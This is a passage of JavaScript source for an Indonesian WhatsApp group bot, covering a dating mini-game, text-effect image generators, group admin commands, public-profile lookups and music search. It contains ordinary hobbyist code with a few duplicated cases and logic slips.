  case 'tolakpasangan':
             if(isNaN(text)) {
             number = text.split`@`[1]
             } else if(!isNaN(text)) {
             number = text
             }
             if (!m.isGroup) return m.reply(mess.group)
             if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
             if(!text && !m.quoted) return Resta.sendText(m.chat, `Masukan nomor, tag atau balas pesan target.`, m)  
             if(isNaN(number)) return Resta.sendText(m.chat, `Nomor yang anda masukan salah!`, m)
             if(number.length > 15) return Resta.sendText(m.chat, `Format salah!`, m)
             try {
             if(text) {
             user = number + '@s.whatsapp.net'
             } else if(m.quoted.sender) {
             user = m.quoted.sender
             } else if(m.mentionedJid) {
             user = number + '@s.whatsapp.net'
             }  
             } catch (e) {
             } finally {
             let groupMetadata = m.isGroup ? await Resta.groupMetadata(m.chat) : {}
             let participants = m.isGroup ? groupMetadata.participants : []
             let users = m.isGroup ? participants.find(u => u.id == user) : {}
             if(users) return m.reply(`Target atau Nomor tidak ditemukan, mungkin sudah keluar atau bukan anggota grup ini.`)
             if(user === m.sender) return m.reply(`Tidak bisa berpacaran dengan diri sendiri!`)
             if(user === Resta.user.jid) return m.reply(`*Tidak bisa berpacaran dengan saya t_t`)    
             if(global.db.data.users[user].pasangan != m.sender){
             Resta.sendTextWithMentions(m.chat,`Maaf @${user.split('@')[0]} tidak sedang menembak anda`,m,{contextInfo: { mentionedJid: [user]}})
             }else{
             global.db.data.users[user].pasangan = ""
             Resta.sendTextWithMentions(m.chat,`Anda baru saja menolak @${user.split('@')[0]} untuk menjadi pasangan anda!`,m,{contextInfo: {mentionedJid: [user]}})
             }
             }
             break
  case 'ikhlasinpasangan':
             if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
             if (global.db.data.users[m.sender].pasangan == "") return m.reply( `Kamu sedang tidak menembak siapapun!`)
             if (global.db.data.users[global.db.data.users[m.sender].pasangan].pasangan == m.sender) return Resta.sendTextWithMentions(m.chat, `Kamu telah berpacaran dengan @${global.db.data.users[m.sender].pasangan.split('@')[0]}`, m, {contextInfo: {mentionedJid: [global.db.data.users[m.sender].pasangan]}})
             Resta.sendTextWithMentions(m.chat, `Kamu sudah mengikhlaskan @${global.db.data.users[m.sender].pasangan.split('@')[0]} karena dia tidak memberikan jawaban diterima atau ditolak`, m, {contextInfo: {mentionedJid: [global.db.data.users[m.sender].pasangan]}})
             global.db.data.users[m.sender].pasangan = ""
             break
//TEXT MAKER//
    case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
    case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
    case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
    case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
    case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
    case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
    case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
    case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
    case 'lava': case 'rock': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
    case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
	           if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
               if (!q) return m.reply(`Example : ${prefix + command} ${global.ownerName}`)                 
               m.reply(mess.wait)
               let link
               if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
               if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
               if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
               if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
               if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
               if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
               if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
               if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
               if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
               if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
               if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
               if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
               if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
               if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
               if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
               if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
               if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
               if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
               if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
               if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
               if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
               if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
               if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
               if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
               if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
               if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
               if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
               if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
               if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
               if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
               if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
               if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
               if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
               if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
               if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
               if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
               if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
               if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
               if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
               if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
               if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
               if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
               if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
               if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
               if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
               if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
               if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
               if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
               if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
               if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
               if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
               if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
               if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
               if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
               if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
               if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
               if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
               anu = await textpro(link, q)
               Resta.sendMessage(m.chat, { image: { url: anu }, caption: `Made by ${global.namaBot}` }, { quoted: m })
               }
               break
               case 'pubg':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks|teks`)
                m.reply(mess.wait)
                const [teks1, teks2] = q.split("|")
                let pab = await lann('https://photooxy.com/battlegrounds/make-wallpaper-battlegrounds-logo-text-146.html', [
                  teks1, teks2
                ])
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              }
              break; 
              case 'bevel':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/bevel-text-between-royal-patterns-166.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              }    
              break  
              case 'luxury':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break      
              case 'flaming':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break  
              case '3d-summer':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break  
              case 'shadow-sky':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break 
              case 'wolf-metal':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'metallic':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/other-design/create-metallic-text-glow-online-188.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'metallic2':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'metallic2':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'burn-paper':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'naruto':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'smoke':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/smoke-typography-text-effect-170.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'flower-typography':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/art-effects/flower-typography-text-effect-164.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'hello-kitty':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'coffe-cup':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/put-your-text-on-a-coffee-cup--174.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'butterfly':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/butterfly-text-with-reflection-effect-183.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'night-sky':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'carved-wood':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/carved-wood-effect-online-171.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
              case 'sweet-candy':{
                if (!q) return m.reply(`Mana Querynya?\nPenggunaan ${prefix + command} teks`)
                m.reply(mess.wait)
                let pab = await lann('https://photooxy.com/logo-and-text-effects/sweet-andy-text-online-168.html', q)
                await Resta.sendMessage(m.chat, { image: { url: pab }, caption: `Dont forget to donate` }, { quoted: m })
              } 
              break
//GROUP SETTINGS//
    case 'antivionce':
               if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
               if (!m.isGroup) return m.reply(mess.group)
               if (!isAdmins) return m.reply(mess.admin)
               if (args[0] === "enable") {
               if (global.db.data.chats[m.chat].antivionce) return m.reply(`Antivionce Aktif Sebelumnya`)
               global.db.data.chats[m.chat].antivionce = true
               m.reply(`Antivionce Di Group Berhasil Di Aktifkan !`)
               } else if (args[0] === "disable") {
               if (!global.db.data.chats[m.chat].antivionce) return m.reply(`Antivionce Nonaktif Sebelumnya`)
               global.db.data.chats[m.chat].antivionce = false
               m.reply(`Antivionce Berhasil Di Nonaktifkan !`)
               } else {
               await Resta.sendMessage(m.chat, { text: `Ketik ${command} enable/disable` },{quoted:m})
               }
               break
    case 'welcomegroup':
               if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
               if (!m.isGroup) return m.reply(mess.group)
               if (!isAdmins) return m.reply(mess.admin)
               if (args[0] === "enable") {
               if (global.db.data.chats[m.chat].welcome) return m.reply(`Welcome Aktif Sebelumnya`)
               global.db.data.chats[m.chat].welcome = true
               m.reply(`Welcome Di Group Berhasil Di Aktifkan !`)
               } else if (args[0] === "disable") {
               if (!global.db.data.chats[m.chat].welcome) return m.reply(`Welcome Nonaktif Sebelumnya`)
               global.db.data.chats[m.chat].welcome = false
               m.reply(`Welcome Berhasil Di Nonaktifkan !`)
               } else {
               await Resta.sendMessage(m.chat, { text: `Ketik ${command} enable/disable` },{quoted:m})
               }
               break
    case 'antilink':
               if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
               if (!m.isGroup) return m.reply(mess.group)
               if (!isBotAdmins) return m.reply(mess.botAdmin)
               if (!isAdmins) return m.reply(mess.admin)
               if (args[0] === "enable") {
               if (global.db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
               global.db.data.chats[m.chat].antilink = true
               m.reply(`Antilink Berhasil Di Aktifkan !`)
               } else if (args[0] === "disable") {
               if (!global.db.data.chats[m.chat].antilink) return m.reply(`Sudah Nonaktif Sebelumnya`)
               global.db.data.chats[m.chat].antilink = false
               m.reply(`Antilink Berhasil Di Nonaktifkan !`)
               } else {
               await Resta.sendMessage(m.chat, { text: `Ketik ${command} enable/disable` },{quoted:m})
               }
               break
    case 'ephemeral':
	           if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
               if (!m.isGroup) return m.reply(mess.group)
               if (!isBotAdmins) return m.reply(mess.botAdmin)
               if (!isAdmins) return m.reply(mess.admin)
               if (args[0] === '1') {
               await Resta.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
               } else if (args[0] === '7') {
               await Resta.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
               } else if (args[0] === '90') {
               await Resta.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
               } else if (args[0] === 'off') {
               await Resta.groupToggleEphemeral(m.chat, 0).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
               } else {
               let sections = [
               {
               title: "CHANGE EPHEMERAL GROUP",
               rows: [
               {title: "Ephemeral 1 day", rowId: `ephemeral 1`, description: `Activate the ephemeral group for 1 day`},
               {title: "Ephemeral 7 day's", rowId: `ephemeral 7`, description: `Activate the ephemeral group for 7 day's`},
               {title: "Ephemeral 90 days's", rowId: `ephemeral 90`, description: `Activate the ephemeral group for 90 day's`},
               {title: "Ephemeral Off", rowId: `ephemeral off`, description: `Deactivate this Ephemeral group`}
                ]
                },
                ]
                Resta.sendListMsg(m.chat, `Please select the following Ephemeral Options List !`, Resta.user.name, `Hello Admin ${groupMetadata.subject}`, `Click Here`, sections, m)
                }
                break
     case 'leave':
                if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                await Resta.groupLeave(m.chat).then((res) => m.reply('Sayonara ðŸ‘‹\nSulit Di Kontrol Semoga Hari Kalian Mengontol')).catch((err) => m.reply('Fitur Error ❎'))
                break
     case 'link':
case 'linkgrup':
case 'linkgroup': case 'linkgc': 
      	      if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                let response = await Resta.groupInviteCode(m.chat)
                Resta.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
                break
     case 'revoke':
        	    if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                await Resta.groupRevokeInvite(from)
                m.reply(mess.done)
                break
     case 'kick':
       	     if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
		        if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		        users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		        await Resta.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(mess.done)).catch((err) => m.reply(jsonformat(err)))
	            break
     case 'add':
		        if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
		        if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		        users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		        await Resta.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(mess.done)).catch((err) => m.reply(jsonformat(err)))
	            break
case 'opromote': {
if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
		        if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
		        users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		        await Resta.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(mess.done)).catch((err) => m.reply(jsonformat(err)))
}
break
     case 'promote':
		        if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
		        if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		        users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		        await Resta.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(mess.done)).catch((err) => m.reply(jsonformat(err)))
	            break
     case 'demote':
		        if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
		        if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		        users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		        await Resta.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(mess.done)).catch((err) => m.reply(jsonformat(err)))
	            break
     case 'setname': case 'setsubject':
	            if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (!text) throw m.reply('textnya?')
                await Resta.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.done)).catch((err) => m.reply(jsonformat(err)))
                break
     case 'setdesc': case 'setdesk':
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (!text) throw m.reply('textnya?')
                await Resta.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.done)).catch((err) => m.reply(jsonformat(err)))
                break
     case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins) return m.reply(mess.admin)
                if (!quoted) return m.reply(`Kirim.reply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return m.reply(`Kirim.reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply(`Kirim.reply Image Dengan Caption ${prefix + command}`)
                var media = await Resta.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                var { img } = await generateProfilePicture(media)
                await Resta.query({
                tag: 'iq',
                attrs: {
                to: m.chat,
                type:'set',
                xmlns: 'w:profile:picture'
                },
                content: [
                {
                tag: 'picture',
                attrs: { type: 'image' },
                content: img
                }
                ]
                })
                fs.unlinkSync(media)
                m.reply(`Sukses`)
                }
                break
     case 'tagall':
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                let teks = `*👥 Tag All By Admin*\n\n🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `乂 @${mem.id.split('@')[0]}\n`
                }
                Resta.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                break
     case 'hidetag':
	            if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                Resta.sendMessage(m.chat, { text : q ? q : 'kosong' , mentions: participants.map(a => a.id)}) 
                break
	case 'otag': {
		if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
		if (!m.quoted) return m.reply(`Reply pesan dengan caption ${prefix + command}`)
               Resta.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
			   break
//STALK//
     case 'igstalk':
                if (!args || !args[0]) throw m.reply(`Gunakan format ${prefix}${command} [username] Contoh: ${prefix}${command} jokowi`)
                m.reply(mess.wait)
                try {
                res = await noapi.igstalk(args[0])
                json = JSON.parse(JSON.stringify(res))
                iggs = `▢ *Username:* ${json.username}\n▢ *Nickname:* ${json.fullName}\n▢ *Followers:* ${json.followers}\n▢ *Following:* ${json.following}\n▢ *Posting:* ${json.postsCount}\n▢ *Link:* https://instagram.com/${json.username}\n▢ *Bio:* ${json.bio}`
                Resta.sendImage(m.chat, json.profilePicHD, iggs, m)
                } catch (err) {
                console.log(err)
                await Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: '💔️ Maaf, Data tidak ditemukan'}, { quoted: m })
                }
                break
     case 'githubstalk':
                if (!text) return m.reply( 'Harap Masukan Username')
                await m.reply(mess.wait)
                try {
                ano = await fetch(`https://api.github.com/users/${text}`).then(a => a.json())
                thumb = await getBuffer(ano.avatar_url)
                hasilnya = `*── 「 GITHUB STALK 」 ──*\n\n➸ *Bio*: ${ano.bio}\n➸ *Perusahaan*: ${ano.company}\n➸ *Repo Publik:* ${ano.public_repos}\n➸ *Gists Publik:* ${ano.public_gists}\n➸ *Follower:* ${ano.followers}\n➸ *Following:* ${ano.following}\n➸ *Lokasi:* ${ano.location}\n➸ *Link:* ${ano.html_url}`
                await Resta.sendMessage(m.chat, { image: thumb, caption: hasilnya, quoted: m })
                } catch (err) {
                console.log(err)
                await Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: '💔️ Maaf, Data tidak ditemukan'}, { quoted: m })
                }
                break
//SEARCHING//
    case 'whatmusic': {
                if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
                try {
	            if (/video|audio/.test(mime)) {
		        let media = await quoted.download()
		        await m.reply(mess.wait)
		        let { status, metadata } = await acr.identify(media)
		        if (status.code !== 0) throw status.msg 
	            let { title, artists, album, genres, release_date } = metadata.music[0]
		        let txt = `*• Title:* ${title}${artists ? `\n*• Artists:* ${artists.map(v => v.name).join(', ')}` : ''}`
	            txt += `${album ? `\n*• Album:* ${album.name}` : ''}${genres ? `\n*• Genres:* ${genres.map(v => v.name).join(', ')}` : ''}\n`
		        txt += `*• Release Date:* ${release_date}`
                Resta.sendMessage(m.chat, { text: txt.trim(), buttons: [{ buttonText: { displayText: 'Play Music' }, buttonId: `${prefix}play ${title} ${artists}` }] }, { quoted: m })
	            } else throw m.reply(`Reply audio/video with command ${prefix + command}`)
	           .catch((err) => Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: '💔️ Maaf, Video tidak ditemukan'}, { quoted: m }))
            } catch (err) {
              Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: '💔️ Maaf, ada kesalahan, mungkin durasinya melebih 20 detik'}, { quoted: m })
            }
            }
             break
     case 'play': case 'ytplay': {
		 if (!text) throw m.reply(`Example : ${prefix + command} story wa anime`)
		 let yts = require("yt-search")
		 let search = await yts(text)
		 let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
		 m.reply(mess.wait)
		 const meplay = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":`Music has been Found`, "h": `Hmm`,'seconds': '0', 'caption': `Music has been Found`, 'jpegThumbnail': await Resta.reSize(anu.thumbnail, 100, 100)}}}
let pla = `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
